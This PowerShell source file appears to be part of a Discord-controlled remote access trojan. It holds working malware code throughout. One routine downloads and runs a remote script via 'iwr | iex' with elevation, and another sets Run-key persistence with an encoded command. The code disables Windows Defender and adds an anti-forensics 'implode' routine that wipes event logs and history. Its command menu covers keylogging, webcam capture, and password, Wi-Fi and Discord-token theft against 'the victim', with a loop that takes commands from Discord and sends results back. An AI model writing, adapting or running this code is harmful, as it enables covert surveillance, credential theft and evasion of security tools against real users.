$process = Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$([Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12); iwr -useb '$StartupPsOnlineFileLocation' | iex`"" -Verb RunAs -PassThru
if ($process -ne $null) {
    Write-Host "User accepted, replacing current session with admin."
    Send-Discord "User accepted, replacing current session with admin."
    Delete-Channel
} else {
    Write-Host "User declined, staying in this session."
    Send-Discord "User declined, staying in this session."
}

        }
        "startup"{
$scriptContent = @"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring 1";
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb '$StartupPsOnlineFileLocation' | iex"
"@
$encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))
$scriptCommand = "powershell.exe -EncodedCommand $encodedScript"

$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regKeyName = "rcHack"
New-ItemProperty -Path $regKeyPath -Name $regKeyName -Value $scriptCommand -PropertyType String -Force

}
        "implode" {
$runningJobs = Get-Job -State Running
foreach ($job in $runningJobs) {
    Stop-Job -Job $job
}
Remove-Job -Job $runningJobs


$filesToDelete = @(
    "help.txt",
    "KeyLog.txt",
    "VoiceLog.txt",
    "passwords.txt",
    "browserdata.txt",
    "networkscan.txt"
)
$tempDirectory = [System.IO.Path]::GetTempPath()
foreach ($file in $filesToDelete) {
    $filePath = Join-Path -Path $tempDirectory -ChildPath $file
    if (Test-Path $filePath -PathType Leaf) {
        Remove-Item -Path $filePath -Force
}
    Clear-History -ErrorAction SilentlyContinue
    Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log } -ErrorAction SilentlyContinue
    Clear-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths' -Name '*' -ErrorAction SilentlyContinue
    Write-Host "Imploding all traces and exiting session."
    Send-Discord "imploding all traces and exiting session."
    Delete-Channel
}}
    "help" {
    $content = @"
COMMAND_NAME                           |                           PARAMETERS
--------------------------------------------------------------------------------
If you see 'Requires admin.', that means the script wasn't run as administrator.
--------------------------------------------------------------------------------
E          X          A          M          P          L          E          S

1. !cmd               // Executes a command in cmd and returns the output
   Example: !cmd ipconfig

2. !powershell        // Executes a command in PowerShell and returns the output
   Example: !powershell ipconfig

3. !dir               // Displays the current directory
   Example: !dir

4. !cd                // Changes the current directory
   Example: !cd C:\location\of\file

5. !download          // Downloads a file from a specified location or current directory
   Example: !download C:\location\of\file\file.txt
   Example: !download file.txt

6. !upload {ATTACHMENT} // Uploads any attachment to the current directory
   Example: !upload {ATTACHMENT}

7. !delete            // Deletes a specified file or directory
   Example: !delete C:\location\of\file\file.txt

8. !availwifi         // Retrieves available Wi-Fi networks
   Example: !availwifi

9. !wifipass          // Retrieves Wi-Fi passwords
   Example: !wifipass

10. !screenshot        // Captures a screenshot of the victim's screen
    Example: !screenshot

11. !webcampic         // Captures and returns a picture from the webcam
    Example: !webcampic

12. !wallpaper         // Changes the wallpaper of the victim's computer
    Example: !wallpaper C:\path\to\wallpaper.jpg

13. !keylogger         // Activates keylogger to record keystrokes
    Example: !keylogger

14. !getkeylog         // Retrieves the logged keystrokes
    Example: !getkeylog

15. !voicelogger       // Activates voicelogger to transcribe spoken words
    Example: !voicelogger

16. !getvoicelog       // Retrieves the logged voice recordings
    Example: !getvoicelog

17. !disabledefender   // Disables Windows Defender
    Example: !disabledefender

18. !disablefirewall   // Disables the Windows Firewall
    Example: !disablefirewall

19. !shutdown          // Shuts down the victim's computer
    Example: !shutdown

20. !restart           // Restarts the victim's computer
    Example: !restart

21. !logoff            // Logs off the user from the victim's computer
    Example: !logoff

22. !msgbox            // Displays a customizable message box
    Example: !msgbox TITLE_HERE,MESSAGE_HERE,Warning,YesNoCancel

23. !hackergoose       // Employs a specialized goose for real-time hacking
    Example: !hackergoose

24. !website           // Opens a specified website
    Example: !website www.example.com

25. !minapps           // Minimizes all windows on the victim's computer
    Example: !minapps

26. !ip                // Retrieves the victim's IP address
    Example: !ip

27. !passwords          // Retrieves the victim's saved passwords
    Example: !passwords

28. !tokengrabber       //Retrieves discord tokens
    Example: !tokengrabber

29. !browserdata       // Retrieves browser data
    Example: !browserdata

30. !networkscan       // Scans and retrieves information about the network
    Example: !networkscan

31. !volume            // Adjusts the volume of the victim's computer
    Example: !volume 50

32. !voice             // Makes the victim's computer speak a specified message
    Example: !voice You are hacked!

33. !proclist       // Retrieves a list of all running processes
    Example: !proclist

34. !prockill          // Terminates a specified process
    Example: !prockill process_name.exe

35. !write             // Types a specified message
    Example: !write Hello, world!

36. !clipboard         // Retrieves the last copied item
    Example: !clipboard

37. !idletime          // Retrieves the duration of the victim's idle time in seconds
    Example: !idletime

38. !datetime          // Retrieves the date and time of the victim's computer
    Example: !datetime

39. !bluescreen        // Triggers a blue screen on the victim's computer
    Example: !bluescreen

40. !geolocate         // Retrieves the victim's geolocation data
    Example: !geolocate

41. !block             // Blocks the victim's keyboard and mouse (requires admin)
    Example: !block

42. !unblock           // Unblocks the victim's keyboard and mouse (requires admin)
    Example: !unblock

43. !disabletaskmgr    // Disables Task Manager (requires admin)
    Example: !disabletaskmgr

44. !enabletaskmgr     // Enables Task Manager (requires admin)
    Example: !enabletaskmgr

45. !admin             //attempts to replace session with admin (shows prompt)
    Example: !admin

46. !startup           // Enables persistence for this script
        will add a ps1 script to startup
        on line 9, set the var StartupPsOnlineFileLocation to the full url of your ps1 file
    Example: !startup

47. !implode           // Triggers a system implosion (Leaves no trace)
    Example: !implode

48. !help              // Displays information about available commands
    Example: !help
"@
    Set-Content -Path "$env:TEMP\help.txt" -Value $content
    Write-Host "$env:TEMP\help.txt"
    Send-Discord -Attachment "$env:TEMP\help.txt"
}
        Default {
    Write-Host "Unknown DiscordCommand: $DiscordCommandName"
    Send-Discord ('Unknown DiscordCommand: `' + $DiscordCommandName + '`')
}
}}






#Computer Info Header;
$ip = (ipconfig | Select-String "IPv4 Address").ToString() -replace '.*?(\d+\.\d+\.\d+\.\d+).*', '$1'
$ip = "``$ip``"
$username = "``$env:USERNAME``"
$adminState = "``$adminState``"
$ComputerInfoHeader = "Device: $ip connected, Username: $username, Admin: $adminState"
Send-Discord $ComputerInfoHeader
DiscordCommand -DiscordCommandName screenshot
DiscordCommand -DiscordCommandName webcampic





Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
#incoming command loop
while ($true) {
    $headers = @{
        'Authorization' = "Bot $token"
    }

    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", $headers.Authorization)

    $url = if ($last_message_id) {
        "https://discord.com/api/v9/channels/$channel_id/messages?after=$last_message_id"
    } else {
        "https://discord.com/api/v9/channels/$channel_id/messages"
    }

    $response = $webClient.DownloadString($url)

    if ($response) {
        $messages = ($response | ConvertFrom-Json)
        if ($messages.Count -gt 0) {

            $message = ($response | ConvertFrom-Json)[0]
            if ($message.content -match '^!') {
                $last_message_id = $message.id
                $attachmentURL = $null
                if ($message.attachments.Count -gt 0) {
                    $attachmentURL = $message.attachments[0].url
                }

                if ($message.content -match '^!(\S+)') {
                    $command = $matches[1]
                    if ($attachmentURL) {
                        $param = $attachmentURL
                    } else {
                        $param = $message.content -replace '^!\S+\s*', ''
                    }
                    #run the command with its param
                    DiscordCommand -DiscordCommandName $command -param $param
                }
            }
        }
    }

    Start-Sleep -Seconds 1
}
